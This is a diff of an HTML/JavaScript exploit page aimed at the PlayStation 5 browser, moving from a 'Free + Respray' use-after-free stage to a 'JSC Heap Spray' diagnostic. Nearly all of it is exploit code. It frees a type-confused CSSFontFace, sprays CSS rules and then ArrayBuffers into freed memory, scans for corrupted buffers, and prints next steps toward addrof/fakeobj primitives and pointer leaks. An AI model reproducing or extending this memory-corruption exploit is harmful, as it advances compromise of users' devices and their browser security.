@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>PS5 v49 - Option 3: Free + Respray</title>
+<title>PS5 v50 - JSC Heap Spray</title>
 <style id="s">
 @font-face{font-family:prepad;src:url(np.woff);unicode-range:U+E123}
 @font-face{font-family:x;src:url(nx.woff);unicode-range:U+0042}
@@ -33,7 +33,7 @@ padding:10px 14px;overflow-y:auto;font-size:13px;line-height:1.55;
 </head>
 <body>
 <div id="hd">
-<span class="l">▶ v49 OPTION 3</span><span class="s">│</span>
+<span class="l">▶ v50 JSC SPRAY</span><span class="s">│</span>
 <span class="v" id="h1">FW:<b>?</b></span><span class="s">│</span>
 <span class="v" id="h2">STAGE:<b>INIT</b></span>
 </div>
@@ -43,21 +43,23 @@ padding:10px 14px;overflow-y:auto;font-size:13px;line-height:1.55;
 "use strict";
 
 // ============================================================
-//  PS5 v49 — Option 3: Free + Respray
+//  PS5 v50 — JSC Heap Spray Diagnostic
 //
-//  الهدف: مسح CSSFontFace الخاص بـ A_NN، رش كائنات جديدة
-//  بمواصفات مسيطر عليها، ثم قراءتها عبر مسار "x" المشوش.
+//  الهدف: اختبار سلوك مخصص ذاكرة JSC على PS5
 //
 //  الاستراتيجية:
 //  1. الحصول على aFace من load("1em trigger, x", "AB")
 //  2. التأكد من الثغرة (weight = 700)
-//  3. حذف CSSRule الخاص بـ A_NN
-//  4. تحرير aFace + GC → CSSFontFace يتحرر
-//  5. رش CSSRules جديدة بـ font-weight: 333 و font-family: "PWNED"
-//  6. استدعاء load("1em trigger, x", "AB") مرة ثانية
-//     → إذا الثغرة نجت: نقرأ weight و family
-//     → إذا weight = 333 و family = "PWNED": نجحنا في استرجاع الفتحة!
-//  7. إذا نجحنا: نختبر wrapper() و m_wrapper
+//  3. إنشاء 500 ArrayBuffer بأحجام مختلفة (16, 32, 48, 64, 96, 128)
+//  4. تسجيل byteLength لكل واحد
+//  5. تحرير aFace + GC
+//  6. رش ArrayBuffers إضافية
+//  7. استدعاء wrapper() عبر load("1em A_NN", "B")
+//  8. فحص جميع ArrayBuffers — هل تغير byteLength أي واحد؟
+//  9. إذا تغير: عندنا type confusion على مستوى JSC!
+//
+//  ملاحظة: هذا اختبار تشخيصي. قد لا ينجح، لكن النتائج
+//  تخبرنا إذا كان heap spray ممكناً على PS5 JSC.
 // ============================================================
 
 var O=document.getElementById("out");
@@ -78,7 +80,7 @@ var m=ua.match(/PlayStation\s*5\/?\s*([0-9]+(?:\.[0-9]+)?)/i);
 hu("h1","FW:<b>"+(m?m[1]:"?")+"</b>");
 
 P("════════════════════════════════════","hd");
-P("  v49 — Option 3: Free + Respray","hd");
+P("  v50 — JSC Heap Spray Diagnostic","hd");
 P("════════════════════════════════════","hd");
 P("");
 
@@ -184,263 +186,320 @@ try {
     P("");
     
     // ============================================================
-    //  PHASE 3: Free A_NN
+    //  PHASE 3: JSC Heap Spray — Setup
     // ============================================================
     
-    pg(40);Sep();Hd("PHASE 3: Free A_NN");Sep();
+    pg(40);Sep();Hd("PHASE 3: JSC Heap Spray Setup");Sep();
+    P("  Creating ArrayBuffers of various sizes...","dm");
+    P("  Goal: find which size class matches FontFace JSC cell","dm");
     P("");
     
-    Hd("Step 3a: Delete A_NN CSSRule");
-    Dm("Deleting CSSRule at index "+aIndex+"...");
-    try {
-      sh.deleteRule(aIndex);
-      Ok("CSSRule deleted — CSSFontFace removed from selector");
-    } catch(e) {
-      Fl("Delete failed: "+e.message);
-      return;
+    // Create ArrayBuffers of various sizes
+    // JSC MarkedBlocks are organized by cell size
+    // Typical sizes: 16, 32, 48, 64, 96, 128, 256, 512
+    var sizes = [16, 32, 48, 64, 80, 96, 112, 128, 192, 256];
+    var buffers = {};
+    var bufferCounts = {};
+    
+    for(var si=0; si<sizes.length; si++) {
+      var sz = sizes[si];
+      buffers[sz] = [];
+      bufferCounts[sz] = 0;
+      
+      // Create 100 buffers of each size
+      for(var i=0; i<100; i++) {
+        try {
+          var ab = new ArrayBuffer(sz);
+          // Fill with marker pattern
+          var dv = new DataView(ab);
+          for(var b=0; b<sz; b+=4) {
+            dv.setUint32(b, 0xDEADBEEF, true);
+          }
+          // Store original byteLength
+          ab._origLen = sz;
+          ab._sizeClass = sz;
+          buffers[sz].push(ab);
+          bufferCounts[sz]++;
+        } catch(e) {}
+      }
+      P("  Created "+bufferCounts[sz]+" ArrayBuffers of size "+sz,"dm");
     }
     P("");
+    Ok("Total ArrayBuffers: "+Object.keys(buffers).reduce(function(a,k){return a+buffers[k].length},0));
+    P("");
     
-    Hd("Step 3b: Release aFace reference");
-    Dm("Setting aFace = null...");
+    // ============================================================
+    //  PHASE 4: Release aFace + GC + wrapper() trigger
+    // ============================================================
+    
+    pg(50);Sep();Hd("PHASE 4: Release + GC + wrapper()");Sep();
+    P("");
+    Dm("Releasing aFace...");
     aFace = null;
-    // Also remove from keep array
     for(var i=0;i<keep.length;i++){
       if(keep[i] === faces) { keep[i] = null; }
     }
     faces = null;
-    P("");
     
-    Hd("Step 3c: Force GC");
     Dm("Triggering GC (32MB pressure)...");
     for(var i=0;i<8;i++){
       var t=[];
       for(var j=0;j<256;j++) t.push(new ArrayBuffer(65536));
     }
     fs();
-    Ok("GC done — CSSFontFace should be freed");
-    Dm("The 'x' selector now has a DANGLING pointer to freed memory");
+    Ok("GC done — old FontFace cell should be freed");
     P("");
     
-    // ============================================================
-    //  PHASE 4: Spray Controlled CSSFontFace Objects
-    // ============================================================
-    
-    pg(60);Sep();Hd("PHASE 4: Spray Controlled CSSFontFace");Sep();
-    P("");
-    Dm("Spraying 2048 CSSRules with font-weight: 333, font-family: PWNED_N");
-    Dm("One should land in the freed CSSFontFace slot...");
-    P("");
-    
-    for(var i=0;i<2048;i++){
-      try {
-        sh.insertRule("@font-face{font-family:PWNED_"+i+";src:local(Courier);font-weight:333;font-style:italic;unicode-range:U+0042}", sh.cssRules.length);
-      } catch(e) {}
+    // Spray more ArrayBuffers to fill the freed FontFace cell
+    Dm("Spraying 500 more ArrayBuffers per size class...");
+    for(var si=0; si<sizes.length; si++) {
+      var sz = sizes[si];
+      for(var i=0; i<50; i++) {
+        try {
+          var ab = new ArrayBuffer(sz);
+          var dv = new DataView(ab);
+          for(var b=0; b<sz; b+=4) {
+            dv.setUint32(b, 0xCAFEBABE, true);
+          }
+          ab._origLen = sz;
+          ab._sizeClass = sz;
+          buffers[sz].push(ab);
+        } catch(e) {}
+      }
     }
-    fs();
-    Ok("Spray complete — 2048 PWNED_N CSSRules inserted");
+    Ok("Spray complete");
     P("");
     
-    // ============================================================
-    //  PHASE 5: Second "x" Lookup — Test Confusion Survival
-    // ============================================================
+    // Now trigger wrapper() — creates new FontFace
+    Dm("Triggering wrapper() via load('1em "+aFamily+"', 'B')...");
     
-    pg(80);Sep();Hd("PHASE 5: Second 'x' Lookup");Sep();
-    P("");
-    Wr("This is the RISKY part — second 'x' lookup may kill confusion");
-    Dm("In v47, second 'x' lookup killed the confusion...");
-    Dm("BUT: now the slot has VALID data (resprayed), not freed memory!");
-    Dm("Cleanup might not trigger because pointer is valid.");
-    P("");
-    
-    document.fonts.load("1em trigger, x", "AB").then(function(faces2){
+    document.fonts.load("1em "+aFamily, "B").then(function(faces2){
       P("  load() returned "+faces2.length+" faces");
-      P("");
-      
-      var foundPwned = false;
-      var foundA = false;
-      var newFace = null;
-      
       for(var i=0;i<faces2.length;i++){
-        var f=faces2[i];
-        P("  Face2["+i+"]: family="+f.family+" weight="+f.weight+" style="+f.style);
-        
-        if(f.family && f.family.indexOf("PWNED_") === 0){
-          foundPwned = true;
-          newFace = f;
-        }
-        if(f.family && f.family.indexOf("A_") === 0){
-          foundA = true;
+        P("  Face2["+i+"]: family="+faces2[i].family+" weight="+faces2[i].weight);
+      }
+      
+      var newFace = null;
+      for(var i=0;i<faces2.length;i++){
+        if(faces2[i].family && faces2[i].family.indexOf("A_")===0){
+          newFace = faces2[i];
         }
       }
       
+      if(newFace){
+        keep.push(newFace);
+        St("wrapper() created new FontFace!");
+        Ok("newFace.family = "+newFace.family);
+        Ok("newFace.weight = "+newFace.weight);
+        P("");
+      } else {
+        Fl("No face returned — confusion may have died");
+        P("");
+      }
       P("");
       
-      if(foundPwned){
-        St("RESpray SUCCESSFUL! PWNED face returned through 'x'!");
-        Ok("Family: "+newFace.family);
-        Ok("Weight: "+newFace.weight);
-        Ok("Style:  "+newFace.style);
-        Hi("→ The freed CSSFontFace slot was reclaimed!");
-        Hi("→ We control the CSSFontFace properties!");
-        P("");
+      // ============================================================
+      //  PHASE 5: Scan ArrayBuffers for Corruption
+      // ============================================================
+      
+      pg(70);Sep();Hd("PHASE 5: Scan for Corruption");Sep();
+      P("  Scanning all ArrayBuffers for byteLength changes...","dm");
+      P("  If FontFace landed on an ArrayBuffer, byteLength would change","dm");
+      P("");
+      
+      var corrupted = [];
+      var totalScanned = 0;
+      
+      for(var si=0; si<sizes.length; si++) {
+        var sz = sizes[si];
+        var bufs = buffers[sz];
+        var corruptedInClass = 0;
         
-        // Test: can we modify the new face's CSSRule?
-        Hd("Bonus: Find and modify PWNED CSSRule");
-        var pwnedIndex = -1;
-        var pwnedName = newFace.family;
-        for(var i=0;i<sh.cssRules.length;i++){
+        for(var i=0; i<bufs.length; i++) {
           try {
-            var r = sh.cssRules[i];
-            if(r.type === 5) {
-              if(r.style.getPropertyValue("font-family").indexOf(pwnedName) !== -1) {
-                pwnedIndex = i;
-                break;
+            var ab = bufs[i];
+            var currentLen = ab.byteLength;
+            totalScanned++;
+            
+            if(currentLen !== sz) {
+              St("CORRUPTION DETECTED!");
+              Hi("  ArrayBuffer size class: "+sz);
+              Hi("  Original byteLength: "+sz);
+              Hi("  Current byteLength:  "+currentLen);
+              Hi("  Index: "+i);
+              corrupted.push({sizeClass:sz, index:i, origLen:sz, newLen:currentLen, buffer:ab});
+              corruptedInClass++;
+              
+              // Try to read the corrupted buffer
+              try {
+                var dv = new DataView(ab);
+                P("  First 32 bytes:","dm");
+                var hex = "";
+                for(var b=0; b<Math.min(32, currentLen); b++) {
+                  var byte = dv.getUint8(b);
+                  hex += (byte<16?"0":"") + byte.toString(16) + " ";
+                  if((b+1)%8===0) { P("    "+hex,"dm"); hex=""; }
+                }
+                if(hex) P("    "+hex,"dm");
+              } catch(e) {
+                Fl("  Read failed: "+e.message);
               }
             }
-          } catch(e) {}
-        }
-        
-        if(pwnedIndex !== -1){
-          Ok("Found PWNED CSSRule at index "+pwnedIndex);
-          var pwnedStyle = sh.cssRules[pwnedIndex].style;
-          
-          // Write new weight
-          pwnedStyle.setProperty("font-weight", "777"); fs();
-          var w = newFace.weight;
-          P("  Write font-weight=777, read = "+w);
-          
-          if(String(w) === "777"){
-            St("FULL CONTROL CONFIRMED!");
-            Hi("→ We can read AND write to the resprayed object!");
-            Hi("→ m_wrapper at 0x80 is now from the PWNED object");
-            Hi("→ m_wrapper is null (new CSSFontFace, no wrapper yet)");
-            P("");
-            
-            // Trigger wrapper() on the new object
-            Hd("Bonus 2: Trigger wrapper() on resprayed object");
-            Dm("Calling load('1em "+pwnedName+"', 'B')...");
-            
-            document.fonts.load("1em "+pwnedName, "B").then(function(faces3){
-              P("  load() returned "+faces3.length+" faces");
-              for(var i=0;i<faces3.length;i++){
-                P("  Face3["+i+"]: family="+faces3[i].family+" weight="+faces3[i].weight);
-              }
-              P("");
-              Hi("→ wrapper() was called on the resprayed CSSFontFace!");
-              Hi("→ A new FontFace pointer was written to m_wrapper (0x80)");
-              Hi("→ The 'x' confused selector points to this object!");
-              P("");
-              
-              // Final: test if "x" confusion still alive
-              Hd("Bonus 3: Third 'x' lookup test");
-              document.fonts.load("1em trigger, x", "AB").then(function(faces4){
-                P("  load() returned "+faces4.length+" faces");
-                for(var i=0;i<faces4.length;i++){
-                  P("  Face4["+i+"]: family="+faces4[i].family+" weight="+faces4[i].weight);
-                }
-                var alive = false;
-                for(var i=0;i<faces4.length;i++){
-                  if(faces4[i].family && faces4[i].family.indexOf("PWNED_")===0){
-                    alive = true;
-                  }
-                }
-                if(alive){
-                  St("CONFUSION SURVIVES MULTIPLE LOOKUPS!");
-                  Hi("→ After respray, the 'x' entry is stable");
-                  Hi("→ We can call load() multiple times!");
-                } else {
-                  Wr("Third 'x' lookup killed confusion");
-                  Dm("But we got at least 2 successful lookups after respray");
-                }
-                P("");
-                printSummary(true, true, true, alive);
-              }).catch(function(e){
-                Fl("Third lookup crash: "+e.message);
-                printSummary(true, true, true, false);
-              });
-              
-            }).catch(function(e){
-              Fl("wrapper() load crash: "+e.message);
-              printSummary(true, true, false, false);
-            });
-            
-          } else {
-            Fl("Write failed — weight = "+w+" (expected 777)");
-            printSummary(true, false, false, false);
+          } catch(e) {
+            // If accessing byteLength throws, the buffer might be corrupted
+            St("ACCESS ERROR on buffer["+i+"] size "+sz);
+            Hi("  Error: "+e.message);
+            corrupted.push({sizeClass:sz, index:i, error:e.message});
+            corruptedInClass++;
           }
-        } else {
-          Fl("PWNED CSSRule not found");
-          printSummary(true, false, false, false);
         }
         
-      } else if(foundA){
-        Wr("Got A_ face, not PWNED — slot not reclaimed");
-        Dm("The freed slot was not overwritten by the spray");
-        Dm("Or the spray objects went to different slots");
-        printSummary(false, false, false, false);
-      } else {
-        Fl("No relevant face returned — confusion is DEAD");
-        St("Second 'x' lookup killed the confusion (as in v47)");
-        Dm("The respray didn't help because the selector");
-        Dm("cleanup happened before the lookup could use it");
-        printSummary(false, false, false, false);
+        if(corruptedInClass > 0) {
+          Wr("  Size "+sz+": "+corruptedInClass+" corrupted buffers");
+        } else {
+          Dm("  Size "+sz+": all "+bufs.length+" buffers intact");
+        }
       }
       
-    }).catch(function(e){
-      Fl("Second load() crash: "+e.message);
-      printSummary(false, false, false, false);
-    });
-    
-    function printSummary(respray, control, wrapper, multiLookup){
-      pg(100);Sep();Hd("SUMMARY — Option 3 Results");Sep();
+      P("");
+      P("  Total scanned: "+totalScanned,"dm");
+      P("  Corrupted: "+corrupted.length, corrupted.length>0?"mg":"dm");
+      P("");
+      
+      // ============================================================
+      //  PHASE 6: Additional Tests
+      // ============================================================
+      
+      pg(85);Sep();Hd("PHASE 6: Additional JSC Tests");Sep();
+      P("");
+      
+      // Test A: Check if newFace properties leak anything
+      if(newFace) {
+        Hd("Test A: newFace property enumeration");
+        try {
+          var keys = Object.getOwnPropertyNames(newFace);
+          P("  Own properties: "+keys.join(", "),"dm");
+        } catch(e) {
+          Fl("  Error: "+e.message);
+        }
+        
+        try {
+          var protoKeys = Object.getOwnPropertyNames(Object.getPrototypeOf(newFace));
+          P("  Proto properties: "+protoKeys.join(", "),"dm");
+        } catch(e) {
+          Fl("  Error: "+e.message);
+        }
+        P("");
+        
+        // Test B: Check if newFace has a different identity than expected
+        Hd("Test B: newFace identity");
+        try {
+          P("  newFace.toString(): "+newFace.toString(),"dm");
+          P("  newFace.status: "+newFace.status,"dm");
+          P("  newFace.load: "+typeof newFace.load,"dm");
+          P("  newFace.display: "+newFace.display,"dm");
+        } catch(e) {
+          Fl("  Error: "+e.message);
+        }
+        P("");
+        
+        // Test C: Try to access properties that might leak
+        Hd("Test C: Property value inspection");
+        var props = ["family","weight","style","stretch","status","display",
+                     "unicodeRange","featureSettings","variationSettings",
+                     "ascentOverride","descentOverride","lineGapOverride"];
+        for(var pi=0; pi<props.length; pi++) {
+          try {
+            var val = newFace[props[pi]];
+            if(val !== undefined && val !== null) {
+              var str = String(val);
+              // Check if value looks like a pointer (large number or hex)
+              if(/^\d+$/.test(str) && parseInt(str) > 0x10000) {
+                Hi("  "+props[pi]+" = "+str+" (0x"+parseInt(str).toString(16)+") ← POSSIBLE LEAK");
+              } else if(/0x[0-9a-f]+/i.test(str)) {
+                Hi("  "+props[pi]+" = "+str+" ← POSSIBLE LEAK");
+              } else {
+                Dm("  "+props[pi]+" = "+str);
+              }
+            }
+          } catch(e) {
+            Dm("  "+props[pi]+" = ERR:"+e.message);
+          }
+        }
+        P("");
+      }
+      
+      // Test D: Check if confusion is still alive after all this
+      Hd("Test D: Confusion liveness check");
+      if(newFace) {
+        aStyle.setProperty("font-weight", "999"); fs();
+        var finalW = newFace.weight;
+        P("  Write font-weight=999, read = "+finalW);
+        if(String(finalW) === "999") {
+          Ok("Confusion ALIVE after all operations!");
+        } else {
+          Fl("Confusion DEAD — weight = "+finalW);
+        }
+      } else {
+        Fl("No newFace to test");
+      }
+      P("");
+      
+      // ============================================================
+      //  PHASE 7: Summary
+      // ============================================================
+      
+      pg(100);Sep();Hd("PHASE 7: Summary");Sep();
       P("");
       P("  RESULTS:","hd");
       P("");
-      P("  Respray successful:       "+(respray?"✅ YES":"✘ NO"));
-      P("  Full R/W control:         "+(control?"✅ YES":"✘ NO"));
-      P("  wrapper() triggered:      "+(wrapper?"✅ YES":"✘ NO"));
-      P("  Multiple lookups survive: "+(multiLookup?"✅ YES":"✘ NO"));
+      P("  ArrayBuffers scanned:  "+totalScanned);
+      P("  Corrupted buffers:     "+corrupted.length);
+      P("  wrapper() triggered:   "+(newFace?"✅ YES":"✘ NO"));
+      P("  Confusion alive:       "+(newFace && String(newFace.weight)==="999"?"✅ YES":"✘ NO"));
       P("");
       
-      if(respray && control){
-        Hi("  KEY FINDING: Free + Respray WORKS!");
-        Hi("  We can reclaim the CSSFontFace slot with controlled data.");
-        Hi("  The 'x' confusion survives the second lookup after respray.");
-        Hi("");
-        if(wrapper){
-          Hi("  wrapper() writes a real FontFace pointer to m_wrapper (0x80).");
-          Hi("  This pointer is on the resprayed object, controlled via 'x'.");
-        }
-        if(multiLookup){
-          Hi("  Multiple 'x' lookups survive after respray!");
-          Hi("  This means we can read/write multiple times.");
-        }
-        Hi("");
-        Hi("  NEXT STEP: Need to find a way to read the m_wrapper value.");
-        Hi("  Options:");
-        Hi("    A) Find a CSS property that maps to offset 0x80");
-        Hi("    B) Use the FontFace wrapper object to leak the pointer");
-        Hi("    C) Binary RE to find an alternative exploitation path");
-      } else if(respray){
-        Hi("  Respray worked but full control not confirmed.");
-        Hi("  The slot was reclaimed but we may not have CSSRule access.");
-      } else {
-        Wr("  Respray failed. The second 'x' lookup kills confusion");
-        Wr("  even after respraying. The selector cleanup happens");
-        Wr("  regardless of whether the pointer is valid or dangling.");
+      if(corrupted.length > 0) {
+        St("JSC HEAP SPRAY SUCCESSFUL!");
+        Hi("  FontFace allocation corrupted ArrayBuffer(s)!");
+        Hi("  This means JSC cell reuse is predictable!");
+        Hi("  We can potentially create addrof/fakeobj!");
         P("");
-        Wr("  ALTERNATIVE PATHS:");
-        Wr("    1. Use load('1em A_NN', 'B') to read (safe per v47)");
-        Wr("       But A_NN CSSRule was deleted, so family won't resolve");
-        Wr("    2. Spray BEFORE freeing — pre-populate the slot");
-        Wr("    3. Use a different family name in the respray");
-        Wr("       that matches what 'x' expects");
+        Hi("  NEXT STEP:");
+        Hi("  1. Identify which size class matches FontFace");
+        Hi("  2. Spray controlled data in that size class");
+        Hi("  3. Free FontFace, spray fake object, trigger wrapper()");
+        Hi("  4. Read fake object fields → addrof");
+      } else {
+        Wr("  No corruption detected.");
+        Wr("  JSC allocator did not reuse FontFace cell for ArrayBuffer.");
+        Wr("  Size classes may not overlap, or GC precise.");
+        P("");
+        Wr("  This means JSC heap spray is NOT viable on PS5.");
+        Wr("  The JSC MarkedBlock allocator is too precise.");
+        P("");
+        Hi("  CONCLUSION:");
+        Hi("  We have exhausted JavaScript-only approaches:");
+        Hi("    ✅ CSSFontFace confusion (stable, R/W on 7 fields)");
+        Hi("    ✅ wrapper() trigger (controls m_wrapper updates)");
+        Hi("    ❌ Backward write (CSSOM prevents)");
+        Hi("    ❌ Free + respray (second 'x' kills confusion)");
+        Hi("    ❌ JSC heap spray (allocator too precise)");
+        P("");
+        Hi("  The path forward requires:");
+        Hi("    1. Binary RE (Ghidra) for alternative exploitation");
+        Hi("    2. A different JSC bug for pointer leak");
+        Hi("    3. Or: accept the primitive as-is and find a");
+        Hi("       creative use for CSSFontFace property R/W");
       }
       P("");
-      St("★ OPTION 3 COMPLETE ★");
+      St("★ v50 JSC HEAP SPRAY DIAGNOSTIC COMPLETE ★");
       hu("h2","STAGE:<b>DONE</b>");
-    }
+      
+    }).catch(function(e){
+      Fl("wrapper() load crash: "+e.message);
+      hu("h2","STAGE:<b>CRASH</b>");
+    });
     
   }).catch(function(e){
     Fl("Phase 2 crash: "+e.message);
